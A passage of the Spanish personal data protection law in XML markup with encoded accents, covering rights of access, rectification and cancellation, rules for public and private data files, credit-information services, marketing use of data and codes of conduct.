conforme a las instrucciones del responsable del tratamiento, que no los aplicar&#x00E1; o utilizar&#x00E1; con &#xFB01;n
distinto al que &#xFB01;gure en dicho contrato, ni los comunicar&#x00E1;, ni siquiera para su conservaci&#x00F3;n, a otras
personas.
<!--br/-->En el contrato se estipular&#x00E1;n, asimismo, las medidas de seguridad a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 9 de esta Ley
que el encargado del tratamiento est&#x00E1; obligado a implementar.
<!--br/-->
</para><!--l. 1030--><para>  3. Una vez cumplida la prestaci&#x00F3;n contractual, los datos de car&#x00E1;cter personal deber&#x00E1;n ser destruidos o
devueltos al responsable del tratamiento, al igual que cualquier soporte o documentos en que conste alg&#x00FA;n
dato de car&#x00E1;cter personal objeto del tratamiento.
<!--br/-->
</para><!--l. 1035--><para>  4. En el caso de que el encargado del tratamiento destine los datos a otra &#xFB01;nalidad, los comunique o los
utilice incumpliendo las estipulaciones del contrato, ser&#x00E1; considerado, tambi&#x00E9;n, responsable del tratamiento,
respondiendo de las infracciones en que hubiera incurrido personalmente.
<!--br/-->
</para><section role="center"><title/>
<!--l. 1039--><para> T&#x00CD;TULO III
</para><!--l. 1041--><para>Derechos de las personas</para></section>
<!--l. 1044--><para>Art&#x02CA;&#x0131;culo 13. Impugnaci&#x00F3;n de valoraciones.

</para><!--l. 1046--><para>  1. Los ciudadanos tienen derecho a no verse sometidos a una decisi&#x00F3;n con efectos jur&#x02CA;&#x0131;dicos, sobre ellos o
que les afecte de manera signi&#xFB01;cativa, que se base &#x00FA;nicamente en un tratamiento de datos destinados a
evaluar determinados aspectos de su personalidad.
<!--br/-->
</para><!--l. 1051--><para>  2. El afectado podr&#x00E1; impugnar los actos administrativos o decisiones privadas que impliquen una
valoraci&#x00F3;n de su comportamiento, cuyo &#x00FA;nico fundamento sea un tratamiento de datos de car&#x00E1;cter personal
que ofrezca una de&#xFB01;nici&#x00F3;n de sus caracter&#x02CA;&#x0131;sticas o personalidad.
<!--br/-->
</para><!--l. 1056--><para>  3. En este caso, el afectado tendr&#x00E1; derecho a obtener informaci&#x00F3;n del responsable del &#xFB01;chero sobre los
criterios de valoraci&#x00F3;n y el programa utilizados en el tratamiento que sirvi&#x00F3; para adoptar la decisi&#x00F3;n en que
consisti&#x00F3; el acto.
<!--br/-->
</para><!--l. 1061--><para>  4. La valoraci&#x00F3;n sobre el comportamiento de los ciudadanos basada en un tratamiento de datos,
&#x00FA;nicamente podr&#x00E1; tener valor probatorio a petici&#x00F3;n del afectado.
<!--br/-->Art&#x02CA;&#x0131;culo 14. Derecho de Consulta al Registro General de Protecci&#x00F3;n de Datos.
</para><!--l. 1068--><para>  Cualquier persona podr&#x00E1; conocer, recabando a tal &#xFB01;n la informaci&#x00F3;n oportuna del Registro General de
Protecci&#x00F3;n de Datos, la existencia de tratamientos de datos de car&#x00E1;cter personal, sus &#xFB01;nalidades y la
identidad del responsable del tratamiento. El Registro General ser&#x00E1; de consulta p&#x00FA;blica y gratuita.
<!--br/-->Art&#x02CA;&#x0131;culo 15. Derecho de acceso.
</para><!--l. 1076--><para>  1. El interesado tendr&#x00E1; derecho a solicitar y obtener gratuitamente informaci&#x00F3;n de sus datos de car&#x00E1;cter
personal sometidos a tratamiento, el origen de dichos datos as&#x02CA;&#x0131; como las comunicaciones realizadas o que
se prev&#x00E9;n hacer de los mismos.
<!--br/-->
</para><!--l. 1081--><para>  2. La informaci&#x00F3;n podr&#x00E1; obtenerse mediante la mera consulta de los datos por medio de su visualizaci&#x00F3;n, o
la indicaci&#x00F3;n de los datos que son objeto de tratamiento mediante escrito, copia, telecopia o fotocopia,
certi&#xFB01;cada o no, en forma legible e inteligible, sin utilizar claves o c&#x00F3;digos que requieran el uso de
dispositivos mec&#x00E1;nicos espec&#x02CA;&#x0131;&#xFB01;cos.
<!--br/-->
</para><!--l. 1087--><para>  3. El derecho de acceso a que se re&#xFB01;ere este art&#x02CA;&#x0131;culo s&#x00F3;lo podr&#x00E1; ser ejercitado a intervalos no inferiores a
doce meses, salvo que el interesado acredite un inter&#x00E9;s leg&#x02CA;&#x0131;timo al efecto, en cuyo caso podr&#x00E1; ejercitarlo
antes.
<!--br/-->Art&#x02CA;&#x0131;culo 16. Derecho de recti&#xFB01;caci&#x00F3;n y cancelaci&#x00F3;n.
</para><!--l. 1094--><para>  1. El responsable del tratamiento tendr&#x00E1; la obligaci&#x00F3;n de hacer efectivo el derecho de recti&#xFB01;caci&#x00F3;n o
cancelaci&#x00F3;n del interesado en el plazo de diez d&#x02CA;&#x0131;as.
<!--br/-->
</para><!--l. 1098--><para>  2. Ser&#x00E1;n recti&#xFB01;cados o cancelados, en su caso, los datos de car&#x00E1;cter personal cuyo tratamiento no se ajuste
a lo dispuesto en la presente Ley y, en particular, cuando tales datos resulten inexactos o
incompletos.
<!--br/-->
</para><!--l. 1102--><para>  3. La cancelaci&#x00F3;n dar&#x00E1; lugar al bloqueo de los datos, conserv&#x00E1;ndose &#x00FA;nicamente a disposici&#x00F3;n de las
Administraciones P&#x00FA;blicas, Jueces y Tribunales, para la atenci&#x00F3;n de las posibles responsabilidades nacidas
del tratamiento, durante el plazo de prescripci&#x00F3;n de &#x00E9;stas.
<!--br/-->Cumplido el citado plazo deber&#x00E1; procederse a la supresi&#x00F3;n.
<!--br/-->
</para><!--l. 1108--><para>  4. Si los datos recti&#xFB01;cados o cancelados hubieran sido comunicados previamente, el responsable del
tratamiento deber&#x00E1; noti&#xFB01;car la recti&#xFB01;caci&#x00F3;n o cancelaci&#x00F3;n efectuada a quien se hayan comunicado, en
el caso de que se mantenga el tratamiento por este &#x00FA;ltimo, que deber&#x00E1; tambi&#x00E9;n proceder a la
cancelaci&#x00F3;n.
<!--br/-->
</para><!--l. 1114--><para>  5. Los datos de car&#x00E1;cter personal deber&#x00E1;n ser conservados durante los plazos previstos en las disposiciones
aplicables o, en su caso, en las relaciones contractuales entre la persona o entidad responsable del
tratamiento y el interesado.
<!--br/-->Art&#x02CA;&#x0131;culo 17. Procedimiento de oposici&#x00F3;n, acceso, recti&#xFB01;caci&#x00F3;n o cancelaci&#x00F3;n.

</para><!--l. 1122--><para>  1. Los procedimientos para ejercitar el derecho de oposici&#x00F3;n, acceso, as&#x02CA;&#x0131; como los de recti&#xFB01;caci&#x00F3;n y
cancelaci&#x00F3;n ser&#x00E1;n establecidos reglamentariamente.
<!--br/-->
</para><!--l. 1126--><para>  2. No se exigir&#x00E1; contraprestaci&#x00F3;n alguna por el ejercicio de los derechos de oposici&#x00F3;n, acceso, recti&#xFB01;caci&#x00F3;n o
cancelaci&#x00F3;n.
<!--br/-->Art&#x02CA;&#x0131;culo 18. Tutela de los derechos.
</para><!--l. 1131--><para>  1. Las actuaciones contrarias a lo dispuesto en la presente Ley pueden ser objeto de reclamaci&#x00F3;n por los
interesados ante la Agencia de Protecci&#x00F3;n de Datos, en la forma que reglamentariamente se
determine.
<!--br/-->
</para><!--l. 1135--><para>  2. El interesado al que se deniegue, total o parcialmente, el ejercicio de los derechos de oposici&#x00F3;n, acceso,
recti&#xFB01;caci&#x00F3;n o cancelaci&#x00F3;n, podr&#x00E1; ponerlo en conocimiento de la Agencia de Protecci&#x00F3;n de Datos o, en su caso,
del Organismo competente de cada Comunidad Aut&#x00F3;noma, que deber&#x00E1; asegurarse de la procedencia o
improcedencia de la denegaci&#x00F3;n.
<!--br/-->
</para><!--l. 1141--><para>  3. El plazo m&#x00E1;ximo en que debe dictarse la resoluci&#x00F3;n expresa de tutela de derechos ser&#x00E1; de seis
meses.
<!--br/-->
</para><!--l. 1144--><para>  4. Contra las resoluciones de la Agencia de Protecci&#x00F3;n de Datos proceder&#x00E1; recurso contencioso&#x2013;administrativo.
<!--br/-->Art&#x02CA;&#x0131;culo 19. Derecho a indemnizaci&#x00F3;n.
</para><!--l. 1149--><para>  1. Los interesados que, como consecuencia del incumplimiento de lo dispuesto en la presente Ley por el
responsable o el encargado del tratamiento, sufran da~no o lesi&#x00F3;n en sus bienes o derechos tendr&#x00E1;n derecho a
ser indemnizados.
<!--br/-->
</para><!--l. 1154--><para>  2. Cuando se trate de &#xFB01;cheros de titularidad p&#x00FA;blica, la responsabilidad se exigir&#x00E1; de acuerdo con la
legislaci&#x00F3;n reguladora del r&#x00E9;gimen de responsabilidad de las Administraciones P&#x00FA;blicas.
<!--br/-->
</para><!--l. 1158--><para>  3. En el caso de los &#xFB01;cheros de titularidad privada, la acci&#x00F3;n se ejercitar&#x00E1; ante los &#x00F3;rganos de la jurisdicci&#x00F3;n
ordinaria.
</para><section role="center"><title/>
<!--l. 1160--><para> T&#x00CD;TULO IV
</para><!--l. 1162--><para>Disposiciones sectoriales</para></section>
<!--l. 1165--><para>CAP&#x00CD;TULO PRIMERO. Ficheros de titularidad p&#x00FA;blica
<!--br/-->Art&#x02CA;&#x0131;culo 20. Creaci&#x00F3;n, modi&#xFB01;caci&#x00F3;n o supresi&#x00F3;n.
</para><!--l. 1169--><para>  1. La creaci&#x00F3;n, modi&#xFB01;caci&#x00F3;n o supresi&#x00F3;n de los &#xFB01;cheros de las Administraciones P&#x00FA;blicas s&#x00F3;lo podr&#x00E1;n hacerse
por medio de disposici&#x00F3;n general publicada en el &#x2018;Bolet&#x02CA;&#x0131;n O&#xFB01;cial del Estado&#x2019; o diario o&#xFB01;cial
correspondiente.
<!--br/-->
</para><!--l. 1174--><para>  2. Las disposiciones de creaci&#x00F3;n o de modi&#xFB01;caci&#x00F3;n de &#xFB01;cheros deber&#x00E1;n indicar:
     </para><itemizedlist>
     <listitem>
     <!--l. 1177--><para>La &#xFB01;nalidad del &#xFB01;chero y los usos previstos para el mismo.
     </para></listitem>
     <listitem>
     <!--l. 1178--><para>Las personas o colectivos sobre los que se pretenda obtener datos de car&#x00E1;cter personal o que
     resulten obligados a suministrarlos.
     </para></listitem>
     <listitem>
     <!--l. 1180--><para>El procedimiento de recogida de los datos de car&#x00E1;cter personal.

     </para></listitem>
     <listitem>
     <!--l. 1181--><para>La estructura b&#x00E1;sica del &#xFB01;chero y la descripci&#x00F3;n de los tipos de datos de car&#x00E1;cter personal incluidos
     en el mismo.
     </para></listitem>
     <listitem>
     <!--l. 1183--><para>Las cesiones de datos de car&#x00E1;cter personal y, en su caso, las transferencias de datos que se
     prevean a pa&#x02CA;&#x0131;ses terceros.
     </para></listitem>
     <listitem>
     <!--l. 1185--><para>Los &#x00F3;rganos de las Administraciones responsables del &#xFB01;chero.
     </para></listitem>
     <listitem>
     <!--l. 1186--><para>Los servicios o unidades ante los que pudiesen ejercitarse los derechos de acceso, recti&#xFB01;caci&#x00F3;n,
     cancelaci&#x00F3;n y oposici&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 1188--><para>Las medidas de seguridad con indicaci&#x00F3;n del nivel b&#x00E1;sico, medio o alto exigible.</para></listitem></itemizedlist>
<!--l. 1192--><para>  3. En las disposiciones que se dicten para la supresi&#x00F3;n de los &#xFB01;cheros se establecer&#x00E1; el destino de los
mismos o, en su caso, las previsiones que se adopten para su destrucci&#x00F3;n.
<!--br/-->Art&#x02CA;&#x0131;culo 21. Comunicaci&#x00F3;n de datos entre Administraciones P&#x00FA;blicas.
</para><!--l. 1199--><para>  1. Los datos de car&#x00E1;cter personal recogidos o elaborados por las Administraciones P&#x00FA;blicas para el
desempe~no de sus atribuciones no ser&#x00E1;n comunicados a otras Administraciones P&#x00FA;blicas para el ejercicio de
competencias diferentes o de competencias que versen sobre materias distintas, salvo cuando la
comunicaci&#x00F3;n hubiere sido prevista por las disposiciones de creaci&#x00F3;n del &#xFB01;chero o por disposici&#x00F3;n de superior
rango que regule su uso, o cuando la comunicaci&#x00F3;n tenga por objeto el tratamiento posterior de los datos
con &#xFB01;nes hist&#x00F3;ricos, estad&#x02CA;&#x0131;sticos o cient&#x02CA;&#x0131;&#xFB01;cos.
<!--br/-->
</para><!--l. 1208--><para>  2. Podr&#x00E1;n, en todo caso, ser objeto de comunicaci&#x00F3;n los datos de car&#x00E1;cter personal que una Administraci&#x00F3;n
P&#x00FA;blica obtenga o elabore con destino a otra.
<!--br/-->
</para><!--l. 1212--><para>  3. No obstante lo establecido en el art&#x02CA;&#x0131;culo 11.2 (b), la comunicaci&#x00F3;n de datos recogidos de fuentes
accesibles al p&#x00FA;blico no podr&#x00E1; efectuarse a &#xFB01;cheros de titularidad privada, sino con el consentimiento del
interesado o cuando una Ley prevea otra cosa.
<!--br/-->
</para><!--l. 1217--><para>  4. En los supuestos previstos en los apartados 1 y 2 del presente art&#x02CA;&#x0131;culo no ser&#x00E1; necesario el
consentimiento del afectado a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 11 de la presente Ley.
<!--br/-->Art&#x02CA;&#x0131;culo 22. Ficheros de las Fuerzas y Cuerpos de Seguridad.
</para><!--l. 1223--><para>  1. Los &#xFB01;cheros creados por las Fuerzas y Cuerpos de Seguridad que contengan datos de car&#x00E1;cter personal
que, por haberse recogido para &#xFB01;nes administrativos, deban ser objeto de registro permanente, estar&#x00E1;n
sujetos al r&#x00E9;gimen general de la presente Ley.
<!--br/-->
</para><!--l. 1228--><para>  2. La recogida y tratamiento para &#xFB01;nes policiales de datos de car&#x00E1;cter personal por las Fuerzas y
Cuerpos de Seguridad sin consentimiento de las personas afectadas est&#x00E1;n limitados a aquellos
supuestos y categor&#x02CA;&#x0131;as de datos que resulten necesarios para la prevenci&#x00F3;n de un peligro real para la
seguridad p&#x00FA;blica o para la represi&#x00F3;n de infracciones penales, debiendo ser almacenados en &#xFB01;cheros
espec&#x02CA;&#x0131;&#xFB01;cos establecidos al efecto, que deber&#x00E1;n clasi&#xFB01;carse por categor&#x02CA;&#x0131;as en funci&#x00F3;n de su grado de
&#xFB01;abilidad.
<!--br/-->

</para><!--l. 1236--><para>  3. La recogida y tratamiento por las Fuerzas y Cuerpos de Seguridad de los datos a que hacen referencia
los apartados 2 y 3 del art&#x02CA;&#x0131;culo 7, podr&#x00E1;n realizarse exclusivamente en los supuestos en que sea
absolutamente necesario para los &#xFB01;nes de una investigaci&#x00F3;n concreta, sin perjuicio del control de legalidad
de la actuaci&#x00F3;n administrativa o de la obligaci&#x00F3;n de resolver las pretensiones formuladas en su caso por los
interesados que corresponden a los &#x00F3;rganos jurisdiccionales.
<!--br/-->
</para><!--l. 1244--><para>  4. Los datos personales registrados con &#xFB01;nes policiales se cancelar&#x00E1;n cuando no sean necesarios para las
averiguaciones que motivaron su almacenamiento.
<!--br/-->A estos efectos, se considerar&#x00E1; especialmente la edad del afectado y el car&#x00E1;cter de los datos almacenados, la
necesidad de mantener los datos hasta la conclusi&#x00F3;n de una investigaci&#x00F3;n o procedimiento concreto, la
resoluci&#x00F3;n judicial &#xFB01;rme, en especial la absolutoria, el indulto, la rehabilitaci&#x00F3;n y la prescripci&#x00F3;n de
responsabilidad.
<!--br/-->Art&#x02CA;&#x0131;culo 23. Excepciones a los derechos de acceso, recti&#xFB01;caci&#x00F3;n y cancelaci&#x00F3;n.
</para><!--l. 1256--><para>  1. Los responsables de los &#xFB01;cheros que contengan los datos a que se re&#xFB01;eren los apartados 2, 3 y
4 del art&#x02CA;&#x0131;culo anterior podr&#x00E1;n denegar el acceso, la recti&#xFB01;caci&#x00F3;n o cancelaci&#x00F3;n en funci&#x00F3;n de los
peligros que pudieran derivarse para la defensa del Estado o la seguridad p&#x00FA;blica, la protecci&#x00F3;n
de los derechos y libertades de terceros o las necesidades de las investigaciones que se est&#x00E9;n
realizando.
<!--br/-->
</para><!--l. 1263--><para>  2. Los responsables de los &#xFB01;cheros de la Hacienda P&#x00FA;blica podr&#x00E1;n, igualmente, denegar el ejercicio de los
derechos a que se re&#xFB01;ere el apartado anterior cuando el mismo obstaculice las actuaciones administrativas
tendentes a asegurar el cumplimiento de las obligaciones tributarias y, en todo caso, cuando el afectado est&#x00E9;
siendo objeto de actuaciones inspectoras.
<!--br/-->
</para><!--l. 1269--><para>  3. El afectado al que se deniegue, total o parcialmente, el ejercicio de los derechos mencionados en los
apartados anteriores podr&#x00E1; ponerlo en conocimiento del Director de la Agencia de Protecci&#x00F3;n
de Datos o del Organismo competente de cada Comunidad Aut&#x00F3;noma en el caso de &#xFB01;cheros
mantenidos por Cuerpos de Polic&#x02CA;&#x0131;a propios de &#x00E9;stas, o por las Administraciones Tributarias
Auton&#x00F3;micas, quienes deber&#x00E1;n asegurarse de la procedencia o improcedencia de la denegaci&#x00F3;n.
<!--br/-->Art&#x02CA;&#x0131;culo 24. Otras excepciones a los derechos de los afectados.
</para><!--l. 1280--><para>  1. Lo dispuesto en los apartados 1 y 2 del art&#x02CA;&#x0131;culo 5 no ser&#x00E1; aplicable a la recogida de datos cuando la
informaci&#x00F3;n al afectado impida o di&#xFB01;culte gravemente el cumplimiento de las funciones de control y
veri&#xFB01;caci&#x00F3;n de las Administraciones P&#x00FA;blicas o cuando afecte a la Defensa Nacional, a la seguridad p&#x00FA;blica o a
la persecuci&#x00F3;n de infracciones penales o administrativas.
<!--br/-->
</para><!--l. 1287--><para>  2. Lo dispuesto en el art&#x02CA;&#x0131;culo 15 y en el apartado 1 del art&#x02CA;&#x0131;culo 16 no ser&#x00E1; de aplicaci&#x00F3;n si, ponderados los
intereses en presencia, resultase que los derechos que dichos preceptos conceden al afectado hubieran de
ceder ante razones de inter&#x00E9;s p&#x00FA;blico o ante intereses de terceros m&#x00E1;s dignos de protecci&#x00F3;n. Si el &#x00F3;rgano
administrativo responsable del &#xFB01;chero invocase lo dispuesto en este apartado, dictar&#x00E1; resoluci&#x00F3;n motivada e
instruir&#x00E1; al afectado del derecho que le asiste a poner la negativa en conocimiento del Director de la
Agencia de Protecci&#x00F3;n de Datos o, en su caso, del &#x00F3;rgano equivalente de las Comunidades Aut&#x00F3;nomas.
<!--br/-->CAP&#x00CD;TULO SEGUNDO. Ficheros de titularidad privada
<!--br/-->Art&#x02CA;&#x0131;culo 25. Creaci&#x00F3;n.
</para><!--l. 1301--><para>  Podr&#x00E1;n crearse &#xFB01;cheros de titularidad privada que contengan datos de car&#x00E1;cter personal cuando resulte
necesario para el logro de la actividad u objeto leg&#x02CA;&#x0131;timos de la persona, empresa o entidad
titular y se respeten las garant&#x02CA;&#x0131;as que esta Ley establece para la protecci&#x00F3;n de las personas.
<!--br/-->Art&#x02CA;&#x0131;culo 26. Noti&#xFB01;caci&#x00F3;n e inscripci&#x00F3;n registral.
</para><!--l. 1308--><para>  1. Toda persona o entidad que proceda a la creaci&#x00F3;n de &#xFB01;cheros de datos de car&#x00E1;cter personal lo noti&#xFB01;car&#x00E1;
previamente a la Agencia de Protecci&#x00F3;n de Datos.
<!--br/-->

</para><!--l. 1312--><para>  2. Por v&#x02CA;&#x0131;a reglamentaria se proceder&#x00E1; a la regulaci&#x00F3;n detallada de los distintos extremos que debe
contener la noti&#xFB01;caci&#x00F3;n, entre los cuales &#xFB01;gurar&#x00E1;n necesariamente el responsable del &#xFB01;chero, la
&#xFB01;nalidad del mismo, su ubicaci&#x00F3;n, el tipo de datos de car&#x00E1;cter personal que contiene, las medidas de
seguridad, con indicaci&#x00F3;n del nivel b&#x00E1;sico, medio o alto exigible y las cesiones de datos de car&#x00E1;cter
personal que se prevean realizar y, en su caso, las transferencias de datos que se prevean a pa&#x02CA;&#x0131;ses
terceros.
<!--br/-->
</para><!--l. 1321--><para>  3. Deber&#x00E1;n comunicarse a la Agencia de Protecci&#x00F3;n de Datos los cambios que se produzcan en la &#xFB01;nalidad
del &#xFB01;chero automatizado, en su responsable y en la direcci&#x00F3;n de su ubicaci&#x00F3;n.
<!--br/-->
</para><!--l. 1325--><para>  4. El Registro General de Protecci&#x00F3;n de Datos inscribir&#x00E1; el &#xFB01;chero si la noti&#xFB01;caci&#x00F3;n se ajusta a los requisitos
exigibles.
<!--br/-->En caso contrario podr&#x00E1; pedir que se completen los datos que falten o se proceda a su subsanaci&#x00F3;n.
<!--br/-->
</para><!--l. 1330--><para>  5. Transcurrido un mes desde la presentaci&#x00F3;n de la solicitud de inscripci&#x00F3;n sin que la Agencia de Protecci&#x00F3;n
de Datos hubiera resuelto sobre la misma, se entender&#x00E1; inscrito el &#xFB01;chero automatizado a todos los efectos.
<!--br/-->Art&#x02CA;&#x0131;culo 27. Comunicaci&#x00F3;n de la cesi&#x00F3;n de datos.
</para><!--l. 1337--><para>  1. El responsable del &#xFB01;chero, en el momento en que se efect&#x00FA;e la primera cesi&#x00F3;n de datos, deber&#x00E1; informar
de ello a los afectados, indicando, asimismo, la &#xFB01;nalidad del &#xFB01;chero, la naturaleza de los datos que han sido
cedidos y el nombre y direcci&#x00F3;n del cesionario.
<!--br/-->
</para><!--l. 1342--><para>  2. La obligaci&#x00F3;n establecida en el apartado anterior no existir&#x00E1; en el supuesto previsto en los
apartados 2, letras (c), (d), (e) y 6 del art&#x02CA;&#x0131;culo 11, ni cuando la cesi&#x00F3;n venga impuesta por Ley.
<!--br/-->Art&#x02CA;&#x0131;culo 28. Datos incluidos en las fuentes de acceso p&#x00FA;blico.
</para><!--l. 1349--><para>  1. Los datos personales que &#xFB01;guren en el censo promocional o las listas de personas pertenecientes a
grupos de profesionales a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 3 (j) de esta Ley deber&#x00E1;n limitarse a los que sean
estrictamente necesarios para cumplir la &#xFB01;nalidad a que se destina cada listado. La inclusi&#x00F3;n de datos
adicionales por las entidades responsables del mantenimiento de dichas fuentes requerir&#x00E1; el consentimiento
del interesado, que podr&#x00E1; ser revocado en cualquier momento.
<!--br/-->
</para><!--l. 1357--><para>  2. Los interesados tendr&#x00E1;n derecho a que la entidad responsable del mantenimiento de los listados de los
Colegios profesionales indique gratuitamente que sus datos personales no pueden utilizarse para &#xFB01;nes de
publicidad o prospecci&#x00F3;n comercial.
<!--br/-->Los interesados tendr&#x00E1;n derecho a exigir gratuitamente la exclusi&#x00F3;n de la totalidad de sus datos personales
que consten en el censo promocional por las entidades encargadas del mantenimiento de dichas
fuentes.
<!--br/-->La atenci&#x00F3;n a la solicitud de exclusi&#x00F3;n de la informaci&#x00F3;n innecesaria o de inclusi&#x00F3;n de la objeci&#x00F3;n al uso de los
datos para &#xFB01;nes de publicidad o venta a distancia deber&#x00E1; realizarse en el plazo de diez d&#x02CA;&#x0131;as respecto de las
informaciones que se realicen mediante consulta o comunicaci&#x00F3;n telem&#x00E1;tica y en la siguiente edici&#x00F3;n del listado
cualquiera que sea el soporte en que se edite.
<!--br/-->
</para><!--l. 1371--><para>  3. Las fuentes de acceso p&#x00FA;blico que se editen en forma de libro o alg&#x00FA;n otro soporte f&#x02CA;&#x0131;sico, perder&#x00E1;n el
car&#x00E1;cter de fuente accesible con la nueva edici&#x00F3;n que se publique.
<!--br/-->En el caso de que se obtenga telem&#x00E1;ticamente una copia de la lista en formato electr&#x00F3;nico, &#x00E9;sta perder&#x00E1; el
car&#x00E1;cter de fuente de acceso p&#x00FA;blico en el plazo de un a~no, contado desde el momento de su
obtenci&#x00F3;n.
<!--br/-->
</para><!--l. 1378--><para>  4. Los datos que &#xFB01;guren en las gu&#x02CA;&#x0131;as de servicios de telecomunicaciones disponibles al p&#x00FA;blico se regir&#x00E1;n
por su normativa espec&#x02CA;&#x0131;&#xFB01;ca.
<!--br/-->Art&#x02CA;&#x0131;culo 29. Prestaci&#x00F3;n de servicios de informaci&#x00F3;n sobre solvencia patrimonial y
cr&#x00E9;dito.
</para><!--l. 1385--><para>  1. Quienes se dediquen a la prestaci&#x00F3;n de servicios de informaci&#x00F3;n sobre la solvencia patrimonial y el
cr&#x00E9;dito s&#x00F3;lo podr&#x00E1;n tratar datos de car&#x00E1;cter personal obtenidos de los registros y las fuentes accesibles al p&#x00FA;blico

establecidos al efecto o procedentes de informaciones facilitadas por el interesado o con su
consentimiento.
<!--br/-->
</para><!--l. 1391--><para>  2. Podr&#x00E1;n tratarse tambi&#x00E9;n datos de car&#x00E1;cter personal relativos al cumplimiento o incumplimiento de
obligaciones dinerarias facilitados por el creedor o por quien act&#x00FA;e por su cuenta o inter&#x00E9;s. En estos casos se
noti&#xFB01;car&#x00E1; a los interesados respecto de los que hayan registrado datos de car&#x00E1;cter personal en &#xFB01;cheros, en el
plazo de treinta d&#x02CA;&#x0131;as desde dicho registro, una referencia de los que hubiesen sido incluidos y se les
informar&#x00E1; de su derecho a recabar informaci&#x00F3;n de la totalidad de ellos, en los t&#x00E9;rminos establecidos por la
presente Ley.
<!--br/-->
</para><!--l. 1400--><para>  3. En los supuestos a que se re&#xFB01;eren los dos apartados anteriores cuando el interesado lo solicite, el
responsable del tratamiento le comunicar&#x00E1; los datos, as&#x02CA;&#x0131; como las evaluaciones y apreciaciones que sobre el
mismo hayan sido comunicadas durante los &#x00FA;ltimos seis meses y el nombre y direcci&#x00F3;n de la persona o
entidad a quien se hayan revelado los datos.
<!--br/-->
</para><!--l. 1406--><para>  4. S&#x00F3;lo se podr&#x00E1;n registrar y ceder los datos de car&#x00E1;cter personal que sean determinantes para enjuiciar la
solvencia econ&#x00F3;mica de los interesados y que no se re&#xFB01;eran, cuando sean adversos, a m&#x00E1;s de seis a~nos,
siempre que respondan con veracidad a la situaci&#x00F3;n actual de aquellos.
<!--br/-->Art&#x02CA;&#x0131;culo 30. Tratamientos con &#xFB01;nes de publicidad y de prospecci&#x00F3;n comercial.
</para><!--l. 1414--><para>  1. Quienes se dediquen a la recopilaci&#x00F3;n de direcciones, reparto de documentos, publicidad, venta a
distancia, prospecci&#x00F3;n comercial y otras actividades an&#x00E1;logas, utilizar&#x00E1;n nombres y direcciones u otros datos
de car&#x00E1;cter personal cuando los mismos &#xFB01;guren en fuentes accesibles al p&#x00FA;blico o cuando hayan sido
facilitados por los propios interesados u obtenidos con su consentimiento.
<!--br/-->
</para><!--l. 1421--><para>  2. Cuando los datos procedan de fuentes accesibles al p&#x00FA;blico, de conformidad con lo establecido en el
p&#x00E1;rrafo segundo del art&#x02CA;&#x0131;culo 5.5 de esta Ley, en cada comunicaci&#x00F3;n que se dirija al interesado se informar&#x00E1; del
origen de los datos y de la identidad del responsable del tratamiento, as&#x02CA;&#x0131; como de los derechos que le
asisten.
<!--br/-->
</para><!--l. 1427--><para>  3. En el ejercicio del derecho de acceso los interesados tendr&#x00E1;n derecho a conocer el origen de
sus datos de car&#x00E1;cter personal, as&#x02CA;&#x0131; como del resto de informaci&#x00F3;n a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo
15.
<!--br/-->
</para><!--l. 1431--><para>  4. Los interesados tendr&#x00E1;n derecho a oponerse, previa petici&#x00F3;n y sin gastos, al tratamiento de los datos que
les conciernan, en cuyo caso ser&#x00E1;n dados de baja del tratamiento, cancel&#x00E1;ndose las informaciones que sobre
ellos &#xFB01;guren en aqu&#x00E9;l, a su simple solicitud.
<!--br/-->Art&#x02CA;&#x0131;culo 31. Censo Promocional.
</para><!--l. 1438--><para>  1. Quienes pretendan realizar permanente o espor&#x00E1;dicamente la actividad de recopilaci&#x00F3;n de direcciones,
reparto de documentos, publicidad, venta a distancia, prospecci&#x00F3;n comercial u otras actividades an&#x00E1;logas,
podr&#x00E1;n solicitar del Instituto Nacional de Estad&#x02CA;&#x0131;stica o de los &#x00F3;rganos equivalentes de las Comunidades
Aut&#x00F3;nomas una copia del censo promocional, formado con los datos de nombre, apellidos y domicilio que
constan en el censo electoral.
<!--br/-->
</para><!--l. 1446--><para>  2. El uso de cada lista de censo promocional tendr&#x00E1; un plazo de vigencia de un a~no. Transcurrido el plazo
citado, la lista perder&#x00E1; su car&#x00E1;cter de fuente de acceso p&#x00FA;blico.
<!--br/-->
</para><!--l. 1450--><para>  3. Los procedimientos mediante los que los interesados podr&#x00E1;n solicitar no aparecer en el censo
promocional se regular&#x00E1;n reglamentariamente. Entre estos procedimientos, que ser&#x00E1;n gratuitos para los
interesados, se incluir&#x00E1; el documento de empadronamiento.
<!--br/-->Trimestralmente se editar&#x00E1; una lista actualizada del censo promocional, excluyendo los nombres y
domicilios de los queas&#x02CA;&#x0131; lo hayan solicitado.
<!--br/-->
</para><!--l. 1457--><para>  4. Se podr&#x00E1; exigir una contraprestaci&#x00F3;n por la facilitaci&#x00F3;n de la citada lista en soporte inform&#x00E1;tico.
<!--br/-->Art&#x02CA;&#x0131;culo 32. C&#x00F3;digos tipo.

</para><!--l. 1462--><para>  1. Mediante acuerdos sectoriales, convenios administrativos o decisiones de empresa, los responsables de
tratamientos de titularidad p&#x00FA;blica y privada as&#x02CA;&#x0131; como las organizaciones en que se agrupen, podr&#x00E1;n
formular c&#x00F3;digos tipo que establezcan las condiciones de organizaci&#x00F3;n, r&#x00E9;gimen de funcionamiento,
procedimientos aplicables, normas de seguridad del entorno, programas o equipos, obligaciones de los
implicados en el tratamiento y uso de la informaci&#x00F3;n personal, as&#x02CA;&#x0131; como las garant&#x02CA;&#x0131;as, en su &#x00E1;mbito, para el
ejercicio de los derechos de las personas con pleno respeto a los principios y disposiciones de la presente
Ley y sus normas de desarrollo.
<!--br/-->
</para><!--l. 1472--><para>  2. Los citados c&#x00F3;digos podr&#x00E1;n contener o no reglas operacionales detalladas de cada sistema particular y
est&#x00E1;ndares t&#x00E9;cnicos de aplicaci&#x00F3;n.
<!--br/-->En el supuesto de que tales reglas o est&#x00E1;ndares no se incorporen directamente al c&#x00F3;digo, las instrucciones u
&#x00F3;rdenes que los establecieran deber&#x00E1;n respetar los principios &#xFB01;jados en aqu&#x00E9;l.
<!--br/-->
</para><!--l. 1479--><para>  3. Los c&#x00F3;digos tipo tendr&#x00E1;n el car&#x00E1;cter de c&#x00F3;digos deontol&#x00F3;gicos o de buena pr&#x00E1;ctica profesional, debiendo ser
